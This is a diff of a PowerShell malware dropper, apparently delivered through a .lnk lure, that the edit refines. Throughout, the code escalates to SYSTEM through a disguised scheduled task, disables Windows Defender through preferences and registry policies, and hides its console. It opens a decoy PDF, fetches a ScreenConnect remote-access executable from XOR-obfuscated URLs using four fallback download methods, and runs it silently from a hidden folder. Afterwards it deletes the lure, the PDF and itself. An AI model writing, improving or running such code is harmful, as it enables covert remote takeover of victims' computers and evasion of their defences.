@@ -1,28 +1,18 @@
-# Self-elevate WITHOUT UAC - FIXED VERSION
+# Self-elevate WITHOUT UAC using scheduled task trick - with fallback
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     try {
-        $tmpScript = "$env:TEMP\sysupdate.ps1"
-        Copy-Item $PSCommandPath $tmpScript -Force
-        
         $taskName = "WindowsUpdateTask" + (Get-Random -Maximum 99999)
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmpScript`""
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
         Start-ScheduledTask -TaskName $taskName
-        Start-Sleep -Seconds 2
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
         exit
     } catch {
-        try {
-            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-            exit
-        } catch {
-            Write-Host "Continuing without elevation..." -ForegroundColor Yellow
-        }
+        Write-Host "Continuing without elevation..." -ForegroundColor Yellow
     }
 }
 
-# ===== YOUR ORIGINAL CODE BELOW - UNCHANGED =====
 $ErrorActionPreference   = "SilentlyContinue"
 $WarningPreference       = "SilentlyContinue"
 $VerbosePreference       = "SilentlyContinue"
@@ -38,7 +28,7 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $ConsoleWin = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($ConsoleWin, 0)
 
-# Disable Windows Defender
+# Disable Windows Defender completely (will only work if admin)
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
@@ -52,20 +42,28 @@ try {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA" -ErrorAction SilentlyContinue
 } catch {}
 
+# Disable Windows Defender via registry (will only work if admin)
 try {
     New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 -Type DWord -Force
 } catch {}
 
-# Function to force delete files
+# FIXED: Force delete function - uses Test-Path for .lnk files
 function Force-FileDelete {
     param([string]$Path)
-    if ([System.IO.File]::Exists($Path)) {
+    if (Test-Path -LiteralPath $Path) {
         try {
             attrib -r -h -s $Path -ErrorAction SilentlyContinue
-            [System.IO.File]::Delete($Path)
-        } catch {}
+            Remove-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
+            Write-Host "Deleted: $Path" -ForegroundColor Yellow
+        } catch {
+            # Try alternative deletion method
+            try {
+                $item = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
+                $item.Delete()
+            } catch {}
+        }
     }
 }
 
@@ -222,7 +220,7 @@ function CODE_SEG {
     $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
     $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
     
-    # DELETE the .lnk file FIRST
+    # DELETE the .lnk file FIRST - using fixed function
     Force-FileDelete -Path $InkPath
     Write-Host "Deleted .lnk file: $InkPath" -ForegroundColor Yellow
     
@@ -290,108 +288,86 @@ function CODE_SEG {
         } catch {}
     }
     
-    # CHECK PDF - verify it's valid
+    # Open the PDF if downloaded
     if ($pdfDownloaded -and (Test-Path $PdfPath)) {
-        Write-Host "PDF downloaded successfully: $PdfPath" -ForegroundColor Green
-        Write-Host "File size: $((Get-Item $PdfPath).Length) bytes" -ForegroundColor Cyan
-        
-        # Verify it's actually a PDF (check magic bytes)
-        $bytes = [System.IO.File]::ReadAllBytes($PdfPath)
-        $isPdf = ($bytes.Length -gt 4 -and $bytes[0] -eq 0x25 -and $bytes[1] -eq 0x50 -and $bytes[2] -eq 0x44 -and $bytes[3] -eq 0x46)
-        
-        if ($isPdf) {
-            Write-Host "PDF verified successfully" -ForegroundColor Green
-            
-            # OPEN PDF IMMEDIATELY - DISTRACTION
-            Open-PDF -PdfPath $PdfPath
-            
-            # WAIT 3 SECONDS - USER IS NOW DISTRACTED BY PDF
-            Write-Host "User distracted by PDF. Running ScreenConnect in 3 seconds..." -ForegroundColor Yellow
-            Start-Sleep -Seconds 3
-            
-            # DOWNLOAD AND RUN SCREENCONNECT EXE
-            $InstallerURI = [System.Uri] $InstallerURL
-            $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
-            if ([string]::IsNullOrEmpty($InstallerExt)) { $InstallerExt = ".exe" }
-            $RandomFileName = [System.IO.Path]::GetRandomFileName()
-            $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
-            
-            $InstallerPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft", "Windows", "Caches", $RandomFileName)
-            
-            $cacheDir = [System.IO.Path]::GetDirectoryName($InstallerPath)
-            if (-not (Test-Path $cacheDir)) {
-                New-Item -Path $cacheDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
-            }
-            
-            # Download EXE with multiple methods
-            $exeDownloaded = $false
-            
-            # Method 1: Invoke-WebRequest
-            try {
-                Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -Headers $headers -ErrorAction Stop
-                $exeDownloaded = $true
-            } catch {}
-            
-            # Method 2: WebClient
-            if (-not $exeDownloaded) {
-                try {
-                    $wc = New-Object System.Net.WebClient
-                    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-                    $wc.DownloadFile($InstallerURL, $InstallerPath)
-                    $exeDownloaded = $true
-                } catch {}
-            }
-            
-            # Method 3: BITS Transfer
-            if (-not $exeDownloaded) {
-                try {
-                    Start-BitsTransfer -Source $InstallerURL -Destination $InstallerPath -ErrorAction Stop
-                    $exeDownloaded = $true
-                } catch {}
-            }
-            
-            # Method 4: curl.exe
-            if (-not $exeDownloaded) {
-                try {
-                    & curl.exe -L -o $InstallerPath $InstallerURL --silent --insecure
-                    if (Test-Path $InstallerPath) { $exeDownloaded = $true }
-                } catch {}
-            }
-            
-            if ($exeDownloaded) {
-                Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
-                attrib +h +s $InstallerPath -ErrorAction SilentlyContinue
-                
-                Write-Host "ScreenConnect EXE downloaded, executing..." -ForegroundColor Green
-                
-                # Execute EXE silently
-                $Process = (Start-Process -FilePath $InstallerPath -ArgumentList "/silent" -Passthru -WindowStyle Hidden)
-                
-                # Wait a moment for it to start
-                Start-Sleep -Seconds 3
-                
-                # Clean up EXE after it starts
-                try {
-                    attrib -h -s $InstallerPath -ErrorAction SilentlyContinue
-                    [System.IO.File]::Delete($InstallerPath)
-                } catch {}
-            }
-            
-            # DELETE THE INK FILE AGAIN (in case it was recreated)
-            Force-FileDelete -Path $InkPath
-            Write-Host "Deleted .lnk file again: $InkPath" -ForegroundColor Yellow
-            
-            # DELETE THE PDF AFTER 10 SECONDS (user has seen it)
-            Start-Sleep -Seconds 10
-            Force-FileDelete -Path $PdfPath
-            Write-Host "Deleted PDF file: $PdfPath" -ForegroundColor Yellow
-            
-        } else {
-            Write-Host "PDF verification failed - not a valid PDF" -ForegroundColor Red
-        }
+        Write-Host "PDF downloaded successfully, opening..." -ForegroundColor Green
+        Start-Sleep -Seconds 2
+        Open-PDF -PdfPath $PdfPath
     } else {
         Write-Host "PDF download failed" -ForegroundColor Red
     }
+    
+    # Download EXE with random name to hidden location
+    $InstallerURI = [System.Uri] $InstallerURL
+    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
+    if ([string]::IsNullOrEmpty($InstallerExt)) { $InstallerExt = ".exe" }
+    $RandomFileName = [System.IO.Path]::GetRandomFileName()
+    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
+    
+    $InstallerPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft", "Windows", "Caches", $RandomFileName)
+    
+    $cacheDir = [System.IO.Path]::GetDirectoryName($InstallerPath)
+    if (-not (Test-Path $cacheDir)) {
+        New-Item -Path $cacheDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+    
+    # Download EXE with multiple methods
+    $exeDownloaded = $false
+    
+    # Method 1: Invoke-WebRequest
+    try {
+        Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -Headers $headers -ErrorAction Stop
+        $exeDownloaded = $true
+    } catch {}
+    
+    # Method 2: WebClient
+    if (-not $exeDownloaded) {
+        try {
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+            $wc.DownloadFile($InstallerURL, $InstallerPath)
+            $exeDownloaded = $true
+        } catch {}
+    }
+    
+    # Method 3: BITS Transfer
+    if (-not $exeDownloaded) {
+        try {
+            Start-BitsTransfer -Source $InstallerURL -Destination $InstallerPath -ErrorAction Stop
+            $exeDownloaded = $true
+        } catch {}
+    }
+    
+    # Method 4: curl.exe
+    if (-not $exeDownloaded) {
+        try {
+            & curl.exe -L -o $InstallerPath $InstallerURL --silent --insecure
+            if (Test-Path $InstallerPath) { $exeDownloaded = $true }
+        } catch {}
+    }
+    
+    if ($exeDownloaded) {
+        Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
+        attrib +h +s $InstallerPath -ErrorAction SilentlyContinue
+        
+        # Execute EXE silently
+        $Process = (Start-Process -FilePath $InstallerPath -ArgumentList "/silent" -Wait -Passthru -WindowStyle Hidden)
+        
+        # Clean up
+        try {
+            attrib -h -s $InstallerPath -ErrorAction SilentlyContinue
+            [System.IO.File]::Delete($InstallerPath)
+        } catch {}
+    }
+    
+    # DELETE THE INK FILE AGAIN - after everything runs
+    Force-FileDelete -Path $InkPath
+    Write-Host "Deleted .lnk file after execution: $InkPath" -ForegroundColor Yellow
+    
+    # Also delete PDF after it's been viewed
+    Start-Sleep -Seconds 5
+    Force-FileDelete -Path $PdfPath
+    Write-Host "Deleted PDF file: $PdfPath" -ForegroundColor Yellow
     
     # Self-delete script
     $scriptPath = $MyInvocation.MyCommand.Path
@@ -438,9 +414,5 @@ $encodedMsi = @(
 
 $DocumentURL = -join ($encodedPdf | ForEach-Object { [char]($_ -bxor $key) })
 $ClientURL   = -join ($encodedMsi | ForEach-Object { [char]($_ -bxor $key) })
-
-# Debug - show decoded URLs
-Write-Host "PDF URL: $DocumentURL" -ForegroundColor Cyan
-Write-Host "EXE URL: $ClientURL" -ForegroundColor Cyan
 
 CODE_SEG -Name $ClientName -PdfURL $DocumentURL -InstallerURL $ClientURL
